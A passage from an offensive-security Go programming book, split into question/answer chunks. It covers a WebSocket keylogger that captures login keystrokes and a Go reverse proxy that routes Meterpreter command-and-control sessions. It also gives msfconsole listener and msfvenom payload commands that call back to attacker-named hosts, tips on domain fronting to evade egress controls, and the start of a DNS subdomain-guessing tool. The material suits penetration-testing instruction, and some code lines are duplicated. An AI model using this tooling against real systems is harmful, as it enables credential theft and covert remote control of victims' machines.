within the variable named jsTemplate. This line of code\nprocesses that template. You pass to it an io.Writer (in this case,\nyou’re using w, an http.ResponseWriter) and your contextual data of\ntype interface{}. The interface{} type means that you can pass any\ntype of variable, whether they’re strings, structs, or something\nelse. In this case, you’re passing a string variable named\nwsAddr. If you jump back up to the init() function, you’ll see that\nthis variable contains the address of your WebSocket server\nand is set via a command line argument. In short, it populates\nthe template with data and writes it as an HTTP response.\nPretty slick!\nYou’ve implemented your handler functions, serveFile() and\nserveWS(). Now, you just need to configure your router to\nperform pattern matching so that you can pass execution to the\nappropriate handler. You do this, much as you have\npreviously, in your main() function. The first of your two\nhandler functions matches the /ws URL pattern, executing your\nserveWS() function to upgrade and handle WebSocket\nconnections ❾. The second route matches the pattern /k.js,\nexecuting the serveFile() function as a result ❿. This is how your\nserver pushes a rendered JavaScript template to the client.\nLet’s fire up the server. If you open the HTML file, you\nshould see a message that reads connection established. This is\nlogged because your JavaScript file has been rendered in the\nbrowser and requested a WebSocket connection. If you enter\ncredentials into the form elements, you should see them\nprinted to stdout on the server:\n$ go run main.go -listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080\nConnection from 127.0.0.1:58438\nFrom 127.0.0.1:58438: u\nFrom 127.0.0.1:58438: s\nFrom 127.0.0.1:58438: e\nFrom 127.0.0.1:58438: r\nFrom 127.0.0.1:58438:\nFrom 127.0.0.1:58438: p\nFrom 127.0.0.1:58438: @\nFrom 127.0.0.1:58438: s\nFrom 127.0.0.1:58438: s\nFrom 127.0.0.1:58438: w\nFrom 127.0.0.1:58438: o\nFrom 127.0.0.1:58438: r\nFrom 127.0.0.1:58438: d"
  },
  {
    "input": "Multiplexing Command-and-Control",
    "output": "You did it! It works! Your output lists each individual\nkeystroke that was pressed when filling out the login form. In\nthis case, it’s a set of user credentials. If you’re having issues,\nmake sure you’re supplying accurate addresses as command\nline arguments. Also, the HTML file itself may need tweaking\nif you’re attempting to call k.js from a server other than\nlocalhost:8080.\nYou could improve this code in several ways. For one, you\nmight want to log the output to a file or other persistent\nstorage, rather than to your terminal. This would make you\nless likely to lose your data if the terminal window closes or\nthe server reboots. Also, if your keylogger logs the keystrokes\nof multiple clients simultaneously, the output will mix the\ndata, making it potentially difficult to piece together a specific\nuser’s credentials. You could avoid this by finding a better\npresentation format that, for example, groups keystrokes by\nunique client/port source.\nYour journey through credential harvesting is complete.\nWe’ll end this chapter by presenting multiplexing HTTP\ncommand-and-control connections.\nMULTIPLEXING COMMAND-AND-\nCONTROL\nYou’ve arrived at the last section of the chapter on HTTP\nservers. Here, you’ll look at how to multiplex Meterpreter\nHTTP connections to different backend control servers.\nMeterpreter is a popular, flexible command-and-control (C2)\nsuite within the Metasploit exploitation framework. We won’t\ngo into too many details about Metasploit or Meterpreter. If\nyou’re new to it, we recommend reading through one of the\nmany tutorial or documentation sites.\nIn this section, we’ll walk through creating a reverse HTTP\nproxy in Go so that you can dynamically route your incoming\nMeterpreter sessions based on the Host HTTP header, which is\nhow virtual website hosting works. However, instead of\nserving different local files and directories, you’ll proxy the\nconnection to different Meterpreter listeners. This is an\ninteresting use case for a few reasons.\nFirst, your proxy acts as a redirector, allowing you to\nexpose only that domain name and IP address without\nexposing your Metasploit listeners. If the redirector ever gets\nblacklisted, you can simply move it without having to move\nyour C2 server. Second, you can extend the concepts here to\nperform domain fronting, a technique for leveraging trusted\nthird-party domains (often from cloud providers) to bypass\nrestrictive egress controls. We won’t go into a full-fledged\nexample here, but we highly recommend you dig into it, as it\ncan be pretty powerful, allowing you to egress restricted\nnetworks. Lastly, the use case demonstrates how you can share\na single host/port combination among a team of allies\npotentially attacking different target organizations. Since ports\n80 and 443 are the most likely allowed egress ports, you can\nuse your proxy to listen on those ports and intelligently route\nthe connections to the correct listener.\nHere’s the plan. You’ll set up two separate Meterpreter\nreverse HTTP listeners. In this example, these will reside on a\nvirtual machine with an IP address of 10.0.1.20, but they could\nvery well exist on separate hosts. You’ll bind your listeners to\nports 10080 and 20080, respectively. In a real situation, these\nlisteners can be running anywhere so long as the proxy can\nreach those ports. Make sure you have Metasploit installed (it\ncomes pre-installed on Kali Linux); then start your listeners.\n$ msfconsole\n> use exploit/multi/handler\n> set payload windows/meterpreter_reverse_http\n❶ > set LHOST 10.0.1.20\n> set LPORT 80\n❷ > set ReverseListenerBindAddress 10.0.1.20\n> set ReverseListenerBindPort 10080\n> exploit -j -z\n[*] Exploit running as background job 1.\n[*] Started HTTP reverse handler on http://10.0.1.20:10080\nWhen you start your listener, you supply the proxy data as\nthe LHOST and LPORT values ❶. However, you set the\nadvanced options ReverseListenerBindAddress and\nReverseListenerBindPort to the actual IP and port on which you\nwant the listener to start ❷. This gives you some flexibility in\nport usage while allowing you to explicitly identify the proxy\nhost—which may be a hostname, for example, if you were\nsetting up domain fronting.\nOn a second instance of Metasploit, you’ll do something\nsimilar to start an additional listener on port 20080. The only\nreal difference here is that you’re binding to a different port:\n$ msfconsole\n> use exploit/multi/handler\n> set payload windows/meterpreter_reverse_http\n> set LHOST 10.0.1.20\n> set LPORT 80\n> set ReverseListenerBindAddress 10.0.1.20\nHivaNetwork.Com\n> set ReverseListenerBindPort 20080\n> exploit -j -z\n[*] Exploit running as background job 1.\n[*] Started HTTP reverse handler on http://10.0.1.20:20080\nNow, let’s create your reverse proxy. Listing 4-10 shows\nthe code in its entirety.\npackage main\nimport (\n\"log\"\n\"net/http\"\n❶ \"net/http/httputil\"\n\"net/url\"\n\"github.com/gorilla/mux\"\n)\n❷ var (\nhostProxy = make(map[string]string)\nproxies = make(map[string]*httputil.ReverseProxy)\n)\nfunc init() {\n❸ hostProxy[\"attacker1.com\"] = \"http://10.0.1.20:10080\"\nhostProxy[\"attacker2.com\"] = \"http://10.0.1.20:20080\"\nfor k, v := range hostProxy {\n❹ remote, err := url.Parse(v)\nif err != nil {\nlog.Fatal(\"Unable to parse proxy target\")\n}\n❺ proxies[k] = httputil.NewSingleHostReverseProxy(remote)\n}\n}\nfunc main() {\nr := mux.NewRouter()\nfor host, proxy := range proxies {\n❻ r.Host(host).Handler(proxy)\n}\nlog.Fatal(http.ListenAndServe(\":80\", r))\n}\nListing 4-10: Multiplexing Meterpreter (/ch-4/multiplexer/main.go)\nFirst off, you’ll notice that you’re importing the\nnet/http/httputil package ❶, which contains functionality to assist\nwith creating a reverse proxy. It’ll save you from having to\ncreate one from scratch.\nAfter you import your packages, you define a pair of\nvariables ❷. Both variables are maps. You’ll use the first,\nhostProxy, to map hostnames to the URL of the Metasploit\nlistener to which you’ll want that hostname to route.\nRemember, you’ll be routing based on the Host header that\nyour proxy receives in the HTTP request. Maintaining this\nmapping is a simple way to determine destinations.\nThe second variable you define, proxies, will also use\nhostnames as its key values. However, their corresponding\nvalues in the map are *httputil.ReverseProxy instances. That is, the\nvalues will be actual proxy instances to which you can route,\nrather than string representations of the destination.\nNotice that you’re hardcoding this information, which isn’t\nthe most elegant way to manage your configuration and proxy\ndata. A better implementation would store this information in\nan external configuration file instead. We’ll leave that as an\nexercise for you.\nYou use an init() function to define the mappings between\ndomain names and destination Metasploit instances ❸. In this\ncase, you’ll route any request with a Host header value of\nattacker1.com to http://10.0.1.20:10080 and anything with a Host header\nvalue of attacker2.com to http://10.0.1.20:20080. Of course, you aren’t\nactually doing the routing yet; you’re just creating your\nrudimentary configuration. Notice that the destinations\ncorrespond to the ReverseListenerBindAddress and\nReverseListenerBindPort values you used for your Meterpreter\nlisteners earlier.\nNext, still within your init() function, you loop over your\nhostProxy map, parsing the destination addresses to create net.URL\ninstances ❹. You use the result of this as input into a call to\nhttputil.NewSingleHostReverseProxy(net.URL) ❺, which is a helper\nfunction that creates a reverse proxy from a URL. Even better,\nthe httputil.ReverseProxy type satisfies the http.Handler interface,\nwhich means you can use the created proxy instances as\nhandlers for your router. You do this within your main()\nfunction. You create a router and then loop over all of your\nproxy instances. Recall that the key is the hostname, and the\nvalue is of type httputil.ReverseProxy. For each key/value pair in\nyour map, you add a matching function onto your router ❻.\nThe Gorilla MUX toolkit’s Route type contains a matching\nfunction named Host that accepts a hostname to match Host\nheader values in incoming requests against. For each hostname\nyou want to inspect, you tell the router to use the\ncorresponding proxy. It’s a surprisingly easy solution to what\ncould otherwise be a complicated problem.\nYour program finishes by starting the server, binding it to\nport 80. Save and run the program. You’ll need to do so as a\nprivileged user since you’re binding to a privileged port.\nAt this point, you have two Meterpreter reverse HTTP\nlisteners running, and you should have a reverse proxy running\nnow as well. The last step is to generate test payloads to check\nthat your proxy works. Let’s use msfvenom, a payload generation\ntool that ships with Metasploit, to generate a pair of Windows\nexecutable files:\n$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20\nLPORT=80\nHttpHostHeader=attacker1.com -f exe -o payload1.exe\n$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20\nLPORT=80\nHttpHostHeader=attacker2.com -f exe -o payload2.exe\nThis generates two output files named payload1.exe and\npayload2.exe. Notice that the only difference between the two,\nbesides the output filename, is the HttpHostHeader values. This\nensures that the resulting payload sends its HTTP requests\nwith a specific Host header value. Also of note is that the LHOST\nand LPORT values correspond to your reverse proxy\ninformation and not your Meterpreter listeners. Transfer the\nresulting executables to a Windows system or virtual machine.\nWhen you execute the files, you should see two new sessions\nestablished: one on the listener bound to port 10080, and one\non the listener bound to port 20080. They should look\nsomething like this:\n>\n[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk)\nRedirecting stageless\nconnection from /pxS_2gL43lv34_birNgRHgL4AJ3A9w3i9FXG3Ne2-\n3UdLhACr8-Qt6QOlOw\nPTkzww3NEptWTOan2rLo5RT42eOdhYykyPYQy8dq3Bq3Mi2TaAEB with UA\n'Mozilla/5.0 (Windows NT 6.1;\nTrident/7.0;\nrv:11.0) like Gecko'"
  },
  {
    "input": "Summary",
    "output": "[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk)\nAttaching\norphaned/stageless session...\n[*] Meterpreter session 1 opened (10.0.1.20:10080 -> 10.0.1.20:60226) at 2020-07-\n03 16:13:34 -0500\nIf you use tcpdump or Wireshark to inspect network traffic\ndestined for port 10080 or 20080, you should see that your\nreverse proxy is the only host communicating with the\nMetasploit listener. You can also confirm that the Host header\nis set appropriately to attacker1.com (for the listener on port\n10080) and attacker2.com (for the listener on port 20080).\nThat’s it. You’ve done it! Now, take it up a notch. As an\nexercise for you, we recommend you update the code to use a\nstaged payload. This likely comes with additional challenges,\nas you’ll need to ensure that both stages are properly routed\nthrough the proxy. Further, try to implement it by using\nHTTPS instead of cleartext HTTP. This will further your\nunderstanding and effectiveness at proxying traffic in useful,\nnefarious ways.\nSUMMARY\nYou’ve completed your journey of HTTP, working through\nboth client and server implementations over the last two\nchapters. In the next chapter, you’ll focus on DNS, an equally\nuseful protocol for security practitioners. In fact, you’ll come\nclose to replicating this HTTP multiplexing example using\nDNS."
  },
  {
    "input": "5 EXPLOITING DNS",
    "output": "5\nEXPLOITING DNS\nThe Domain Name System (DNS) locates internet domain\nnames and translates them to IP addresses. It can be an\neffective weapon in the hands of an attacker, because\norganizations commonly allow the protocol to egress restricted\nnetworks and they frequently fail to monitor its use\nadequately. It takes a little knowledge, but savvy attackers can\nleverage these issues throughout nearly every step of an attack\nchain, including reconnaissance, command and control (C2),\nand even data exfiltration. In this chapter, you’ll learn how to\nwrite your own utilities by using Go and third-party packages\nto perform some of these capabilities.\nYou’ll start by resolving hostnames and IP addresses to\nreveal the many types of DNS records that can be enumerated.\nThen you’ll use patterns illustrated in earlier chapters to build\na massively concurrent subdomain-guessing tool. Finally,\nyou’ll learn how to write your own DNS server and proxy, and\nyou’ll use DNS tunneling to establish a C2 channel out of a\nrestrictive network!"
  },
  {
    "input": "Writing DNS Clients",
    "output": "WRITING DNS CLIENTS\nBefore exploring programs that are more complex, let’s get\nacquainted with some of the options available for client\noperations. Go’s built-in net package offers great functionality\nand supports most, if not all, record types. The upside to the\nbuilt-in package is its straightforward API. For example,\nLookupAddr(addr string) returns a list of hostnames for a given IP\naddress. The downside of using Go’s built-in package is that\nyou can’t specify the destination server; instead, the package\nwill use the resolver configured on your operating system.\nAnother downside is that you can’t run deep inspection of the\nresults.\nTo get around this, you’ll use an amazing third-party\npackage called the Go DNS package written by Miek Gieben.\nThis is our preferred DNS package because it’s highly\nmodular, well written, and well tested. Use the following to\ninstall this package:\n$ go get github.com/miekg/dns\nOnce the package is installed, you’re ready to follow along\nwith the upcoming code examples. You’ll begin by performing\nA record lookups in order to resolve IP addresses for\nhostnames.\nRetrieving A Records\nLet’s start by performing a lookup for a fully qualified domain\nname (FQDN), which specifies a host’s exact location in the\nDNS hierarchy. Then we’ll attempt to resolve that FQDN to an\nIP address, using a type of DNS record called an A record. We\nuse A records to point a domain name to an IP address. Listing\n5-1 shows an example lookup. (All the code listings at the root\nlocation of / exist under the provided github repo\nhttps://github.com/blackhat-go/bhg/.)\npackage main\nimport (\n\"fmt\"\n\"github.com/miekg/dns\"\n)\nfunc main() {\n❶ var msg dns.Msg\n❷ fqdn := dns.Fqdn(\"stacktitan.com\")\n❸ msg.SetQuestion(fqdn, dns.TypeA)\n❹ dns.Exchange(&msg, \"8.8.8.8:53\")\n}\nListing 5-1: Retrieving an A record (/ch-5/get_a/main.go)\nStart by creating a new Msg ❶ and then call fqdn(string) to\ntransform the domain into a FQDN that can be exchanged with\na DNS server ❷. Next, modify the internal state of the Msg\nwith a call to SetQuestion(string, uint16) by using the TypeA value to\ndenote your intent to look up an A record ❸. (This is a const\ndefined in the package. You can view the other supported\nvalues in the package documentation.) Finally, place a call to\nExchange(*Msg, string) ❹ in order to send the message to the\nprovided server address, which is a DNS server operated by\nGoogle in this case.\nAs you can probably tell, this code isn’t very useful.\nAlthough you’re sending a query to a DNS server and asking\nfor the A record, you aren’t processing the answer; you aren’t\ndoing anything meaningful with the result. Prior to\nprogrammatically doing that in Go, let’s first review what the\nDNS answer looks like so that we can gain a deeper\nunderstanding of the protocol and the different query types.\nBefore you execute the program in Listing 5-1, run a\npacket analyzer, such as Wireshark or tcpdump, to view the\ntraffic. Here’s an example of how you might use tcpdump on a\nLinux host:\n$ sudo tcpdump -i eth0 -n udp port 53\nIn a separate terminal window, compile and execute your\nprogram like this:\n$ go run main.go\nOnce you execute your code, you should see a connection\nto 8.8.8.8 over UDP 53 in the output from your packet capture.\nYou should also see details about the DNS protocol, as shown\nhere:\n$ sudo tcpdump -i eth0 -n udp port 53\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes\n23:55:16.523741 IP 192.168.7.51.53307 > 8.8.8.8.53:❶ 25147+ A?❷\nstacktitan.com. (32)\n23:55:16.650905 IP 8.8.8.8.53 > 192.168.7.51.53307: 25147 1/0/0 A\n104.131.56.170 (48) ❸\nThe packet capture output produces a couple of lines that\nrequire further explanation. First, a query is being placed from\n192.168.7.51 to 8.8.8.8 by using UDP 53 ❶ while requesting\na DNS A record ❷. The response ❸ is returned from\nGoogle’s 8.8.8.8 DNS server, which contains the resolved IP\naddress, 104.131.56.170.\nUsing a packet analyzer such as tcpdump, you’re able to\nresolve the domain name stacktitan.com to an IP address. Now\nlet’s take a look at how to extract that information by using\nGo.\nProcessing Answers from a Msg struct\nThe returned values from Exchange(*Msg, string) are (*Msg, error).\nReturning the error type makes sense and is common in Go\nidioms, but why does it return *Msg if that’s what you passed\nin? To clarify this, look at how the struct is defined in the\nsource:\ntype Msg struct {\nMsgHdr\nCompress bool `json:\"-\"` // If true, the message will be compressed...\n❶ Question []Question // Holds the RR(s) of the question section.\n❷ Answer []RR // Holds the RR(s) of the answer section.\nNs []RR // Holds the RR(s) of the authority section.\nExtra []RR // Holds the RR(s) of the additional section.\n}\nAs you can see, the Msg struct holds both questions and\nanswers. This lets you consolidate all your DNS questions and\ntheir answers into a single, unified structure. The Msg type has\nvarious methods that make working with the data easier. For\nexample, the Question slice ❶ is being modified with the\nconvenience method SetQuestion(). You could modify this slice\ndirectly by using append() and achieve the same outcome. The\nAnswer slice ❷ holds the response to the queries and is of type\nRR. Listing 5-2 demonstrates how to process the answers.\nHivaNetwork.Com\npackage main\nimport (\n\"fmt\"\n\"github.com/miekg/dns\"\n)\nfunc main() {\nvar msg dns.Msg\nfqdn := dns.Fqdn(\"stacktitan.com\")\nmsg.SetQuestion(fqdn, dns.TypeA)\n❶ in, err := dns.Exchange(&msg, \"8.8.8.8:53\")\nif err != nil {\npanic(err)\n}\n❷ if len(in.Answer) < 1 {\nfmt.Println(\"No records\")\nreturn\n}\nfor _, answer := range in.Answer {\nif a❸, ok:= answer.(*dns.A)❹; ok {\n❺ fmt.Println(a.A)\n}\n}\n}\nListing 5-2: Processing DNS answers (/ch-5/get_all_a/main.go)\nOur example begins by storing the values returned from\nExchange, checking whether there was an error, and if so, calling\npanic() to stop the program ❶. The panic() function lets you\nquickly see the stack trace and identify where the error\noccurred. Next, validate that the length of the Answer slice is at\nleast 1 ❷, and if it isn’t, indicate that there are no records and\nimmediately return—after all, there will be legitimate\ninstances when the domain name cannot be resolved.\nThe type RR is an interface with only two defined methods,\nand neither allows access to the IP address stored in the\nanswer. To access those IP addresses, you’ll need to perform a\ntype assertion to create an instance of the data as your desired\ntype.\nFirst, loop over all the answers. Next, perform the type\nassertion on the answer to ensure that you’re dealing with a\n*dns.A type ❸. When performing this action, you can receive\ntwo values: the data as the asserted type and a bool representing\nwhether the assertion was successful ❹. After checking\nwhether the assertion was successful, print the IP address\nstored in a.A ❺. Although the type is net.IP, it does implement a\nString() method, so you can easily print it.\nSpend time with this code, modifying the DNS query and\nexchange to search for additional records. The type assertion\nmay be unfamiliar, but it’s a similar concept to type casting in\nother languages.\nEnumerating Subdomains\nNow that you know how to use Go as a DNS client, you can\ncreate useful tools. In this section, you’ll create a subdomain-\nguessing utility. Guessing a target’s subdomains and other\nDNS records is a foundational step in reconnaissance, because\nthe more subdomains you know, the more you can attempt to\nattack. You’ll supply our utility a candidate wordlist (a\ndictionary file) to use for guessing subdomains.\nWith DNS, you can send requests as fast as your operating\nsystem can handle the processing of packet data. While the\nlanguage and runtime aren’t going to become a bottleneck, the\ndestination server will. Controlling the concurrency of your\nprogram will be important here, just as it has been in previous\nchapters.\nFirst, create a new directory in your GOPATH called\nsubdomain_guesser, and create a new file main.go. Next,\nwhen you first start writing a new tool, you must decide which\narguments the program will take. This subdomain-guessing\nprogram will take several arguments, including the target\ndomain, the filename containing subdomains to guess, the\ndestination DNS server to use, and the number of workers to\nlaunch. Go provides a useful package for parsing command\nline options called flag that you’ll use to handle your command\nline arguments. Although we don’t use the flag package across\nall of our code examples, we’ve opted to use it in this case to\ndemonstrate more robust, elegant argument parsing. Listing 5-\n3 shows our argument-parsing code.\npackage main\nimport (\n\"flag\"\n)\nfunc main() {\nvar (\nflDomain = flag.String(\"domain\", \"\", \"The domain to perform guessing\nagainst.\") ❶\nflWordlist = flag.String(\"wordlist\", \"\", \"The wordlist to use for guessing.\")\nflWorkerCount = flag.Int(\"c\", 100, \"The amount of workers to use.\") ❷\nflServerAddr = flag.String(\"server\", \"8.8.8.8:53\", \"The DNS server to use.\")\n)\nflag.Parse() ❸\n}\nListing 5-3: Building a subdomain guesser (/ch-5/subdomain_guesser/main.go)\nFirst, the code line declaring the flDomain variable ❶ takes a\nString argument and declares an empty string default value for\nwhat will be parsed as the domain option. The next pertinent line\nof code is the flWorkerCount variable declaration ❷. You need to\nprovide an Integer value as the c command line option. In this\ncase, set this to 100 default workers. But this value is probably\ntoo conservative, so feel free to increase the number when\ntesting. Finally, a call to flag.Parse() ❸ populates your variables\nby using the provided input from the user.\nNOTE\nYou may have noticed that the example is going against Unix law in that it\nhas defined optional arguments that aren’t optional. Please feel free to use\nos.Args here. We just find it easier and faster to let the flag package do all the\nwork.\nIf you try to build this program, you should receive an error\nabout unused variables. Add the following code immediately\nafter your call to flag.Parse(). This addition prints the variables to\nstdout along with code, ensuring that the user provided -domain\nand -wordlist:\nif *flDomain == \"\" || *flWordlist == \"\" {\nfmt.Println(\"-domain and -wordlist are required\")\nos.Exit(1)\n}\nfmt.Println(*flWorkerCount, *flServerAddr)\nTo allow your tool to report which names were resolvable\nalong with their respective IP addresses, you’ll create a struct\ntype to store this information. Define it above the main()\nfunction:\ntype result struct {\ntype result struct {\nIPAddress string\nHostname string\n}\nYou’ll query two main record types—A and CNAME—for\nthis tool. You’ll perform each query in a separate function. It’s\na good idea to keep your functions as small as possible and to\nhave each perform one thing well. This style of development\nallows you to write smaller tests in the future.\nQuerying A and CNAME Records\nYou’ll create two functions to perform queries: one for A\nrecords and the other for CNAME records. Both functions\naccept a FQDN as the first argument and the DNS server\naddress as the second. Each should return a slice of strings and\nan error. Add these functions to the code you began defining\nin Listing 5-3. These functions should be defined outside\nmain().\nfunc lookupA(fqdn, serverAddr string) ([]string, error) {\nvar m dns.Msg\nvar ips []string\nm.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)\nin, err := dns.Exchange(&m, serverAddr)\nif err != nil {\nreturn ips, err\n}\nif len(in.Answer) < 1 {\nreturn ips, errors.New(\"no answer\")\n}\nfor _, answer := range in.Answer {\nif a, ok := answer.(*dns.A); ok {\nips = append(ips, a.A.String())\n}\n}\nreturn ips, nil\nreturn ips, nil\n}\nfunc lookupCNAME(fqdn, serverAddr string) ([]string, error) {\nvar m dns.Msg\nvar fqdns []string\nm.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)\nin, err := dns.Exchange(&m, serverAddr)\nif err != nil {\nreturn fqdns, err\n}\nif len(in.Answer) < 1 {\nreturn fqdns, errors.New(\"no answer\")\n}\nfor _, answer := range in.Answer {\nif c, ok := answer.(*dns.CNAME); ok {\nfqdns = append(fqdns, c.Target)\n}\n}\nreturn fqdns, nil\n}\nThis code should look familiar because it’s nearly identical\nto the code you wrote in the first section of this chapter. The\nfirst function, lookupA, returns a list of IP addresses, and\nlookupCNAME returns a list of hostnames.\nCNAME, or canonical name, records point one FQDN to\nanother one that serves as an alias for the first. For instance,\nsay the owner of the example.com organization wants to host a\nWordPress site by using a WordPress hosting service. That\nservice may have hundreds of IP addresses for balancing all of\ntheir users’ sites, so providing an individual site’s IP address\nwould be infeasible. The WordPress hosting service can\ninstead provide a canonical name (a CNAME) that the owner\nof example.com can reference. So www.example.com might\nhave a CNAME pointing to someserver.hostingcompany.org,\nwhich in turn has an A record pointing to an IP address. This\nallows the owner of example.com to host their site on a server\nfor which they have no IP information.\nOften this means you’ll need to follow the trail of\nCNAMES to eventually end up at a valid A record. We say\ntrail because you can have an endless chain of CNAMES.\nPlace the function in the following code outside main() to see\nhow you can use the trail of CNAMES to track down the valid\nA record:\nfunc lookup(fqdn, serverAddr string) []result {\n❶ var results []result\n❷ var cfqdn = fqdn // Don't modify the original.\nfor {\n❸ cnames, err := lookupCNAME(cfqdn, serverAddr)\n❹ if err == nil && len(cnames) > 0 {\n❺ cfqdn = cnames[0]\n❻ continue // We have to process the next CNAME.\n}\n❼ ips, err := lookupA(cfqdn, serverAddr)\nif err != nil {\nbreak // There are no A records for this hostname.\n}\n❽ for _, ip := range ips {\nresults = append(results, result{IPAddress: ip, Hostname: fqdn})\n}\n❾ break // We have processed all the results.\n}\nreturn results\n}\nFirst, define a slice to store results ❶. Next, create a copy\nof the FQDN passed in as the first argument ❷, not only so\nyou don’t lose the original FQDN that was guessed, but also\nso you can use it on the first query attempt. After starting an\ninfinite loop, try to resolve the CNAMEs for the FQDN ❸. If\nno errors occur and at least one CNAME is returned ❹, set\ncfqdn to the CNAME returned ❺, using continue to return to the\nbeginning of the loop ❻. This process allows you to follow\nthe trail of CNAMES until a failure occurs. If there’s a failure,\nwhich indicates that you’ve reached the end of the chain, you\ncan then look for A records ❼; but if there’s an error, which\nindicates something went wrong with the record lookup, then\nyou leave the loop early. If there are valid A records, append\neach of the IP addresses returned to your results slice ❽ and\nbreak out of the loop ❾. Finally, return the results to the caller.\nOur logic associated with the name resolution seems sound.\nHowever, you haven’t accounted for performance. Let’s make\nour example goroutine-friendly so you can add concurrency.\nPassing to a Worker Function\nYou’ll create a pool of goroutines that pass work to a worker\nfunction, which performs a unit of work. You’ll do this by\nusing channels to coordinate work distribution and the\ngathering of results. Recall that you did something similar in\nChapter 2, when you built a concurrent port scanner.\nContinue to expand the code from Listing 5-3. First, create\nthe worker() function and place it outside main(). This function\ntakes three channel arguments: a channel for the worker to\nsignal whether it has closed, a channel of domains on which to\nreceive work, and a channel on which to send results. The\nfunction will need a final string argument to specify the DNS\nserver to use. The following code shows an example of our\nworker() function:\ntype empty struct{} ❶\nfunc worker(tracker chan empty, fqdns chan string, gather chan []result,\nserverAddr string) {\nfor fqdn := range fqdns { ❷\nresults := lookup(fqdn, serverAddr)\nif len(results) > 0 {\ngather <- results ❸\n}\n}\nvar e empty\ntracker <- e ❹\n}\nBefore introducing the worker() function, first define the type\nempty to track when the worker finishes ❶. This is a struct with\nno fields; you use an empty struct because it’s 0 bytes in size\nand will have little impact or overhead when used. Then, in the\nworker() function, loop over the domains channel ❷, which is\nused to pass in FQDNs. After getting results from your lookup()\nfunction and checking to ensure there is at least one result,\nsend the results on the gather channel ❸, which accumulates the\nresults back in main(). After the work loop exits because the\nchannel has been closed, an empty struct is sent on the tracker\nchannel ❹ to signal the caller that all work has been\ncompleted. Sending the empty struct on the tracker channel is\nan important last step. If you don’t do this, you’ll have a race\ncondition, because the caller may exit before the gather channel\nreceives results.\nSince all of the prerequisite structure is set up at this point,\nlet’s refocus our attention back to main() to complete the\nprogram we began in Listing 5-3. Define some variables that\nwill hold the results and the channels that will be passed to\nworker(). Then append the following code into main():\nvar results []result\nvar results []result\nfqdns := make(chan string, *flWorkerCount)\ngather := make(chan []result)\ntracker := make(chan empty)\nCreate the fqdns channel as a buffered channel by using the\nnumber of workers provided by the user. This allows the\nworkers to start slightly faster, as the channel can hold more\nthan a single message before blocking the sender.\nCreating a Scanner with bufio\nNext, open the file provided by the user to consume as a word\nlist. With the file open, create a new scanner by using the bufio\npackage. The scanner allows you to read the file one line at a\ntime. Append the following code into main():\nfh, err := os.Open(*flWordlist)\nif err != nil {\npanic(err)\n}\ndefer fh.Close()\nscanner := bufio.NewScanner(fh)\nThe built-in function panic() is used here if the error returned\nis not nil. When you’re writing a package or program that\nothers will use, you should consider presenting this\ninformation in a cleaner format.\nYou’ll use the new scanner to grab a line of text from the\nsupplied word list and create a FQDN by combining the text\nwith the domain the user provides. You’ll send the result on\nthe fqdns channel. But you must start the workers first. The\norder of this is important. If you were to send your work down\nthe fqdns channel without starting the workers, the buffered\nHivaNetwork.Com\nchannel would eventually become full, and your producers\nwould block. You’ll add the following code to your main()\nfunction. Its purpose is to start the worker goroutines, read\nyour input file, and send work on your fqdns channel.\n❶ for i := 0; i < *flWorkerCount; i++ {\ngo worker(tracker, fqdns, gather, *flServerAddr)\n}\n❷ for scanner.Scan() {\nfqdns <- fmt.Sprintf(\"%s.%s\", scanner.Text()❸, *flDomain)\n}\nCreating the workers ❶ by using this pattern should look\nsimilar to what you did when building your concurrent port\nscanner: you used a for loop until you reached the number\nprovided by the user. To grab each line in the file, scanner.Scan()\nis used in a loop ❷. This loop ends when there are no more\nlines to read in the file. To get a string representation of the\ntext from the scanned line, use scanner.Text() ❸.\nThe work has been launched! Take a second to bask in\ngreatness. Before reading the next code, think about where you\nare in the program and what you’ve already done in this book.\nTry to complete this program and then continue to the next\nsection, where we’ll walk you through the rest.\nGathering and Displaying the Results\nTo finish up, first start an anonymous goroutine that will\ngather the results from the workers. Append the following\ncode into main():\ngo func() {\nfor r := range gather {\n❶ results = append(results, r...❷)\n}\nvar e empty\n❸ tracker <- e\n}()\nBy looping over the gather channel, you append the received\nresults onto the results slice ❶. Since you’re appending a slice\nto another slice, you must use the ... syntax ❷. After you close\nthe gather channel and the loop ends, send an empty struct to the\ntracker channel as you did earlier ❸. This is done to prevent a\nrace condition in case append() doesn’t finish by the time you\neventually present the results to the user.\nAll that’s left is closing the channels and presenting the\nresults. Include the following code at the bottom of main() in\norder to close the channels and present the results to the user:\n❶ close(fqdns)\n❷ for i := 0; i < *flWorkerCount; i++ {\n<-tracker\n}\n❸ close(gather)\n❹ <-tracker\nThe first channel that can be closed is fqdns ❶ because\nyou’ve already sent all the work on this channel. Next, you\nneed to receive on the tracker channel one time for each of the\nworkers ❷, allowing the workers to signal that they exited\ncompletely. With all of the workers accounted for, you can\nclose the gather channel ❸ because there are no more results to\nreceive. Finally, receive one more time on the tracker channel to\nallow the gathering goroutine to finish completely ❹.\nThe results aren’t yet presented to the user. Let’s fix that. If\nyou wanted to, you could easily loop over the results slice and\nprint the Hostname and IPAddress fields by using fmt.Printf(). We\nprefer, instead, to use one of Go’s several great built-in\npackages for presenting data; tabwriter is one of our favorites. It\nallows you to present data in nice, even columns broken up by\ntabs. Add the following code to the end of main() to use tabwriter\nto print your results:\nw := tabwriter.NewWriter(os.Stdout, 0, 8, 4, ' ', 0)\nfor _, r := range results {\nfmt.Fprintf(w, \"%s\\t%s\\n\", r.Hostname, r.IPAddress)\n}\nw.Flush()\nListing 5-4 shows the program in its entirety.\nPackage main\nimport (\n\"bufio\"\n\"errors\"\n\"flag\"\n\"fmt\"\n\"os\"\n\"text/tabwriter\"\n\"github.com/miekg/dns\"\n)\nfunc lookupA(fqdn, serverAddr string) ([]string, error) {\nvar m dns.Msg\nvar ips []string\nm.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)\nin, err := dns.Exchange(&m, serverAddr)\nif err != nil {\nreturn ips, err\n}\nif len(in.Answer) < 1 {\nreturn ips, errors.New(\"no answer\")\n}\nfor _, answer := range in.Answer {\nif a, ok := answer.(*dns.A); ok 